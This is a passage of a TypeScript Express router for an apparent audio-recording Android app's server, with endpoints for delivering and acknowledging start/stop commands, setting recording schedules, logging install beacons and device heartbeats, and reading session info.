        const startTime = cmd ? (cmd.start_time || "") : "";
        const stopTime = cmd ? (cmd.stop_time || "") : "";

        // Don't clear START/STOP commands here — wait for the APK to acknowledge via /command/ack
        if (commandStr === 'START' || commandStr === 'STOP') {
            console.log(`[broadcast] Command delivered to ${client_id}: ${commandStr} (awaiting ACK)`);
        }

        res.json({
            command: commandStr,
            start_time: startTime,
            stop_time: stopTime
        });
    } catch (err: any) {
        res.status(500).json({ status: 'error', message: err.message });
    }
});

// APK acknowledges it successfully processed a command
router.post('/command/ack', (req: Request, res: Response) => {
    try {
        const { client_id, command } = req.body;
        if (!client_id || !command) {
            res.status(400).json({ status: 'error', message: 'Missing client_id or command' });
            return;
        }

        // Only clear the command if it matches what the APK is acknowledging
        const current = db.getDeviceCommand(client_id);
        if (current && current.command === command) {
            db.clearDeviceCommand(client_id);
            console.log(`[broadcast] Command ACK received from ${client_id}: ${command}`);
        }

        res.json({ status: 'acknowledged', client_id, command });
    } catch (err: any) {
        res.status(500).json({ status: 'error', message: err.message });
    }
});



router.post('/schedule', (req: Request, res: Response) => {
    try {
        const { client_id, start_time, stop_time, interval_hours } = req.body;
        if (!client_id) {
            res.status(400).json({ status: 'error', message: 'Missing client_id' });
            return;
        }
        db.updateDeviceSchedule(client_id, start_time || "", stop_time || "");
        const interval = interval_hours ? parseInt(interval_hours, 10) : 2;
        console.log(`[broadcast] Schedule set for ${client_id}: start=${start_time}, stop=${stop_time}, interval=${interval}h`);

        // Instant 0ms push to connected device over WebSocket
        const pushed = sendDeviceCommand(client_id, 'SET_SCHEDULE', {
            start_time: start_time || "",
            stop_time: stop_time || "",
            interval_hours: interval
        });

        res.json({
            status: 'success',
            client_id,
            start_time,
            stop_time,
            interval_hours: interval,
            pushed_via_socket: pushed
        });
    } catch (err: any) {
        res.status(500).json({ status: 'error', message: err.message });
    }
});



// ════════════════════════════════════════════════════════════════════════════
// APP INSTALL BEACON (Tracks when client APK is first installed / activated)
// ════════════════════════════════════════════════════════════════════════════

router.post('/install-beacon', (req: Request, res: Response) => {
    try {
        const { client_id, device_model, manufacturer, os_version, app_version } = req.body || {};
        if (!client_id) {
            res.status(400).json({ status: 'error', message: 'Missing client_id' });
            return;
        }

        const forwarded = req.headers['x-forwarded-for'];
        const ip = typeof forwarded === 'string' ? forwarded.split(',')[0].trim() : req.ip || req.socket.remoteAddress || '';

        const record = db.recordDeviceInstall(
            client_id,
            device_model || 'Unknown',
            manufacturer || 'Android',
            os_version || '',
            app_version || '',
            ip
        );

        console.log(`[broadcast] 📱 New App Install beacon recorded: ${record.manufacturer} ${record.device_model} (Client ID: ${record.client_id}) from IP ${ip}`);

        broadcastLiveEvent({
            type: 'new_install',
            data: record,
        });

        res.json({ status: 'ok', message: 'Install beacon recorded successfully', install: record });
    } catch (err: any) {
        console.error('[broadcast] Error recording install beacon:', err);
        res.status(500).json({ status: 'error', message: err.message });
    }
});

// ════════════════════════════════════════════════════════════════════════════
// HOURLY DEVICE HEARTBEAT (Signals device is ALIVE without recording audio)
// ════════════════════════════════════════════════════════════════════════════

router.post('/heartbeat', (req: Request, res: Response) => {
    try {
        const { client_id, status, is_recording, battery, storage_mb, app_version, trigger_source } = req.body || {};
        if (!client_id) {
            res.status(400).json({ status: 'error', message: 'Missing client_id' });
            return;
        }

        const forwarded = req.headers['x-forwarded-for'];
        const ip = typeof forwarded === 'string' ? forwarded.split(',')[0].trim() : req.ip || req.socket.remoteAddress || '';
        const now = new Date().toISOString();
        const effectiveStatus = is_recording ? 'recording' : (status || 'alive');

        db.recordDeviceHeartbeat(
            client_id,
            effectiveStatus,
            !!is_recording,
            typeof battery === 'number' ? battery : -1,
            typeof storage_mb === 'number' ? storage_mb : -1,
            app_version || '',
            trigger_source || 'hourly',
            ip
        );

        console.log(`[heartbeat] 💓 Device ${client_id} is ALIVE (Status: ${effectiveStatus}, Battery: ${battery ?? '?'}%, Recording: ${!!is_recording})`);

        broadcastLiveEvent({
            type: 'device_heartbeat',
            client_id,
            status: effectiveStatus,
            is_recording: !!is_recording,
            battery,
            storage_mb,
            timestamp: now,
        });

        res.json({
            status: 'ok',
            message: 'Heartbeat acknowledged: device confirmed alive',
            server_time: now,
        });
    } catch (err: any) {
        console.error('[broadcast] Error recording heartbeat:', err);
        res.status(500).json({ status: 'error', message: err.message });
    }
});

// ════════════════════════════════════════════════════════════════════════════
// GET SESSION INFO (Must remain after /command to prevent route shadowing)
// ════════════════════════════════════════════════════════════════════════════

router.get('/:session_id', (req: Request, res: Response) => {
    try {
        const session_id = req.params.session_id as string;
        const session = db.getSession(session_id);
        if (!session) {
            res.status(404).json({ status: 'not_found' });
            return;
        }

        const chunks = db.getSessionChunks(session_id);

        res.json({
            session,
            chunks_count: chunks.length,
            latest_sequence: chunks.length > 0 ? chunks[chunks.length - 1].sequence_num : -1,
        });
    } catch (err: any) {
        res.status(500).json({ status: 'error', message: err.message });
    }
});

export default router;

